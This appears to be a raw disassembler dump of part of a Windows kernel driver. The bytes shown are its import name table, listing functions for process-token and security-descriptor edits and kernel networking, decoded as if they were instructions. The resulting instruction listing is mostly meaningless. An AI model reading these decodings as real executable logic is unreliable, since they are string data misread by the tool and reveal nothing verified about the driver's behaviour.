   140015adc:	6c                   	insb   (%dx),(%rdi)
   140015add:	4c                   	rex.WR
   140015ade:	65 6e                	outsb  %gs:(%rsi),(%dx)
   140015ae0:	67 74 68             	addr32 je 0x140015b4b
   140015ae3:	53                   	push   %rbx
   140015ae4:	69 64 00 00 d1 07 52 	imul   $0x745207d1,0x0(%rax,%rax,1),%esp
   140015aeb:	74 
   140015aec:	6c                   	insb   (%dx),(%rdi)
   140015aed:	43 6f                	rex.XB outsl (%rsi),(%dx)
   140015aef:	6e                   	outsb  (%rsi),(%dx)
   140015af0:	76 65                	jbe    0x140015b57
   140015af2:	72 74                	jb     0x140015b68
   140015af4:	53                   	push   %rbx
   140015af5:	69 64 54 6f 55 6e 69 	imul   $0x63696e55,0x6f(%rsp,%rdx,2),%esp
   140015afc:	63 
   140015afd:	6f                   	outsl  (%rsi),(%dx)
   140015afe:	64 65 53             	fs gs push %rbx
   140015b01:	74 72                	je     0x140015b75
   140015b03:	69 6e 67 00 00 df 07 	imul   $0x7df0000,0x67(%rsi),%ebp
   140015b0a:	52                   	push   %rdx
   140015b0b:	74 6c                	je     0x140015b79
   140015b0d:	43 72 65             	rex.XB jb 0x140015b75
   140015b10:	61                   	(bad)
   140015b11:	74 65                	je     0x140015b78
   140015b13:	41 63 6c 00 00       	movsxd 0x0(%r8,%rax,1),%ebp
   140015b18:	93                   	xchg   %eax,%ebx
   140015b19:	07                   	(bad)
   140015b1a:	52                   	push   %rdx
   140015b1b:	74 6c                	je     0x140015b89
   140015b1d:	41                   	rex.B
   140015b1e:	64 64 41 63 63 65    	fs movsxd %fs:0x65(%r11),%esp
   140015b24:	73 73                	jae    0x140015b99
   140015b26:	41 6c                	rex.B insb (%dx),(%rdi)
   140015b28:	6c                   	insb   (%dx),(%rdi)
   140015b29:	6f                   	outsl  (%rsi),(%dx)
   140015b2a:	77 65                	ja     0x140015b91
   140015b2c:	64 41 63 65 00       	movsxd %fs:0x0(%r13),%esp
   140015b31:	00 31                	add    %dh,(%rcx)
   140015b33:	09 52 74             	or     %edx,0x74(%rdx)
   140015b36:	6c                   	insb   (%dx),(%rdi)
   140015b37:	53                   	push   %rbx
   140015b38:	65 74 4f             	gs je  0x140015b8a
   140015b3b:	77 6e                	ja     0x140015bab
   140015b3d:	65 72 53             	gs jb  0x140015b93
   140015b40:	65 63 75 72          	movsxd %gs:0x72(%rbp),%esi
   140015b44:	69 74 79 44 65 73 63 	imul   $0x72637365,0x44(%rcx,%rdi,2),%esi
   140015b4b:	72 
   140015b4c:	69 70 74 6f 72 00 4f 	imul   $0x4f00726f,0x74(%rax),%esi
   140015b53:	07                   	(bad)
   140015b54:	50                   	push   %rax
   140015b55:	73 4c                	jae    0x140015ba3
   140015b57:	6f                   	outsl  (%rsi),(%dx)
   140015b58:	6f                   	outsl  (%rsi),(%dx)
   140015b59:	6b 75 70 50          	imul   $0x50,0x70(%rbp),%esi
   140015b5d:	72 6f                	jb     0x140015bce
   140015b5f:	63 65 73             	movsxd 0x73(%rbp),%esp
   140015b62:	73 42                	jae    0x140015ba6
   140015b64:	79 50                	jns    0x140015bb6
   140015b66:	72 6f                	jb     0x140015bd7
   140015b68:	63 65 73             	movsxd 0x73(%rbp),%esp
   140015b6b:	73 49                	jae    0x140015bb6
   140015b6d:	64 00 00             	add    %al,%fs:(%rax)
   140015b70:	5e                   	pop    %rsi
   140015b71:	06                   	(bad)
   140015b72:	4f 62 4f 70 65 6e    	(bad)
   140015b78:	4f 62 6a 65 63 74    	(bad)
   140015b7e:	42 79 50             	rex.X jns 0x140015bd1
   140015b81:	6f                   	outsl  (%rsi),(%dx)
   140015b82:	69 6e 74 65 72 00 e0 	imul   $0xe0007265,0x74(%rsi),%ebp
   140015b89:	0a 5a 77             	or     0x77(%rdx),%bl
   140015b8c:	4f 70 65             	rex.WRXB jo 0x140015bf4
   140015b8f:	6e                   	outsb  (%rsi),(%dx)
   140015b90:	50                   	push   %rax
   140015b91:	72 6f                	jb     0x140015c02
   140015b93:	63 65 73             	movsxd 0x73(%rbp),%esp
   140015b96:	73 54                	jae    0x140015bec
   140015b98:	6f                   	outsl  (%rsi),(%dx)
   140015b99:	6b 65 6e 45          	imul   $0x45,0x6e(%rbp),%esp
   140015b9d:	78 00                	js     0x140015b9f
   140015b9f:	00 48 0b             	add    %cl,0xb(%rax)
   140015ba2:	5a                   	pop    %rdx
   140015ba3:	77 53                	ja     0x140015bf8
   140015ba5:	65 74 53             	gs je  0x140015bfb
   140015ba8:	65 63 75 72          	movsxd %gs:0x72(%rbp),%esi
   140015bac:	69 74 79 4f 62 6a 65 	imul   $0x63656a62,0x4f(%rcx,%rdi,2),%esi
   140015bb3:	63 
   140015bb4:	74 00                	je     0x140015bb6
   140015bb6:	11 07                	adc    %eax,(%rdi)
   140015bb8:	50                   	push   %rax
   140015bb9:	73 47                	jae    0x140015c02
   140015bbb:	65 74 50             	gs je  0x140015c0e
   140015bbe:	72 6f                	jb     0x140015c2f
   140015bc0:	63 65 73             	movsxd 0x73(%rbp),%esp
   140015bc3:	73 49                	jae    0x140015c0e
   140015bc5:	6d                   	insl   (%dx),(%rdi)
   140015bc6:	61                   	(bad)
   140015bc7:	67 65 46 69 6c 65 4e 	imul   $0x656d61,%gs:0x4e(%ebp,%r12d,2),%r13d
   140015bce:	61 6d 65 00 
   140015bd2:	54                   	push   %rsp
   140015bd3:	07                   	(bad)
   140015bd4:	50                   	push   %rax
   140015bd5:	73 50                	jae    0x140015c27
   140015bd7:	72 6f                	jb     0x140015c48
   140015bd9:	63 65 73             	movsxd 0x73(%rbp),%esp
   140015bdc:	73 54                	jae    0x140015c32
   140015bde:	79 70                	jns    0x140015c50
   140015be0:	65 00 b8 09 53 65 45 	add    %bh,%gs:0x45655309(%rax)
   140015be7:	78 70                	js     0x140015c59
   140015be9:	6f                   	outsl  (%rsi),(%dx)
   140015bea:	72 74                	jb     0x140015c60
   140015bec:	73 00                	jae    0x140015bee
   140015bee:	6e                   	outsb  (%rsi),(%dx)
   140015bef:	74 6f                	je     0x140015c60
   140015bf1:	73 6b                	jae    0x140015c5e
   140015bf3:	72 6e                	jb     0x140015c63
   140015bf5:	6c                   	insb   (%dx),(%rdi)
   140015bf6:	2e 65 78 65          	cs js,pn 0x140015c5f
   140015bfa:	00 00                	add    %al,(%rax)
   140015bfc:	27                   	(bad)
   140015bfd:	02 57 73             	add    0x73(%rdi),%dl
   140015c00:	6b 52 65 67          	imul   $0x67,0x65(%rdx),%edx
   140015c04:	69 73 74 65 72 00 24 	imul   $0x24007265,0x74(%rbx),%esi
   140015c0b:	02 57 73             	add    0x73(%rdi),%dl
   140015c0e:	6b 43 61 70          	imul   $0x70,0x61(%rbx),%eax
   140015c12:	74 75                	je     0x140015c89
   140015c14:	72 65                	jb     0x140015c7b
   140015c16:	50                   	push   %rax
   140015c17:	72 6f                	jb     0x140015c88
   140015c19:	76 69                	jbe    0x140015c84
   140015c1b:	64 65 72 4e          	fs gs jb 0x140015c6d
   140015c1f:	50                   	push   %rax
   140015c20:	49 00 28             	rex.WB add %bpl,(%r8)
   140015c23:	02 57 73             	add    0x73(%rdi),%dl
   140015c26:	6b 52 65 6c          	imul   $0x6c,0x65(%rdx),%edx
   140015c2a:	65 61                	gs (bad)
   140015c2c:	73 65                	jae    0x140015c93
   140015c2e:	50                   	push   %rax
   140015c2f:	72 6f                	jb     0x140015ca0
   140015c31:	76 69                	jbe    0x140015c9c
   140015c33:	64 65 72 4e          	fs gs jb 0x140015c85
   140015c37:	50                   	push   %rax
   140015c38:	49 00 25 02 57 73 6b 	rex.WB add %spl,0x6b735702(%rip)        # 0x1ab74b341
   140015c3f:	44                   	rex.R
   140015c40:	65 72 65             	gs jb  0x140015ca8
   140015c43:	67 69 73 74 65 72 00 	imul   $0x4e007265,0x74(%ebx),%esi
   140015c4a:	4e 
   140015c4b:	45 54                	rex.RB push %r12
   140015c4d:	49                   	rex.WB
   140015c4e:	4f                   	rex.WRXB
   140015c4f:	2e 53                	cs push %rbx
   140015c51:	59                   	pop    %rcx
   140015c52:	53                   	push   %rbx
   140015c53:	00 40 04             	add    %al,0x4(%rax)
   140015c56:	4b                   	rex.WXB
   140015c57:	65 42 75 67          	gs rex.X jne 0x140015cc2
   140015c5b:	43 68 65 63 6b 45    	rex.XB push $0x456b6365
   140015c61:	78 00                	js     0x140015c63
   140015c63:	00 dc                	add    %bl,%ah
   140015c65:	07                   	(bad)
   140015c66:	52                   	push   %rdx
   140015c67:	74 6c                	je     0x140015cd5
   140015c69:	43 6f                	rex.XB outsl (%rsi),(%dx)
   140015c6b:	70 79                	jo     0x140015ce6
   140015c6d:	55                   	push   %rbp
   140015c6e:	6e                   	outsb  (%rsi),(%dx)
   140015c6f:	69 63 6f 64 65 53 74 	imul   $0x74536564,0x6f(%rbx),%esp
   140015c76:	72 69                	jb     0x140015ce1
   140015c78:	6e                   	outsb  (%rsi),(%dx)
   140015c79:	67 00 00             	add    %al,(%eax)
   140015c7c:	08 00                	or     %al,(%rax)
   140015c7e:	57                   	push   %rdi
   140015c7f:	64 66 56             	fs push %si
   140015c82:	65 72 73             	gs jb  0x140015cf8
   140015c85:	69 6f 6e 55 6e 62 69 	imul   $0x69626e55,0x6e(%rdi),%ebp
   140015c8c:	6e                   	outsb  (%rsi),(%dx)
   140015c8d:	64 00 00             	add    %al,%fs:(%rax)
   140015c90:	06                   	(bad)
   140015c91:	00 57 64             	add    %dl,0x64(%rdi)
   140015c94:	66 56                	push   %si
   140015c96:	65 72 73             	gs jb  0x140015d0c
   140015c99:	69 6f 6e 42 69 6e 64 	imul   $0x646e6942,0x6e(%rdi),%ebp
   140015ca0:	00 00                	add    %al,(%rax)
   140015ca2:	07                   	(bad)
   140015ca3:	00 57 64             	add    %dl,0x64(%rdi)
   140015ca6:	66 56                	push   %si
   140015ca8:	65 72 73             	gs jb  0x140015d1e
   140015cab:	69 6f 6e 42 69 6e 64 	imul   $0x646e6942,0x6e(%rdi),%ebp
   140015cb2:	43 6c                	rex.XB insb (%dx),(%rdi)
   140015cb4:	61                   	(bad)
   140015cb5:	73 73                	jae    0x140015d2a
   140015cb7:	00 09                	add    %cl,(%rcx)
   140015cb9:	00 57 64             	add    %dl,0x64(%rdi)
   140015cbc:	66 56                	push   %si
   140015cbe:	65 72 73             	gs jb  0x140015d34
   140015cc1:	69 6f 6e 55 6e 62 69 	imul   $0x69626e55,0x6e(%rdi),%ebp
   140015cc8:	6e                   	outsb  (%rsi),(%dx)
   140015cc9:	64 43 6c             	fs rex.XB insb (%dx),(%rdi)
   140015ccc:	61                   	(bad)
   140015ccd:	73 73                	jae    0x140015d42
   140015ccf:	00 57 44             	add    %dl,0x44(%rdi)
   140015cd2:	46                   	rex.RX
   140015cd3:	4c                   	rex.WR
   140015cd4:	44 52                	rex.R push %rdx
   140015cd6:	2e 53                	cs push %rbx
   140015cd8:	59                   	pop    %rcx
   140015cd9:	53                   	push   %rbx
	...
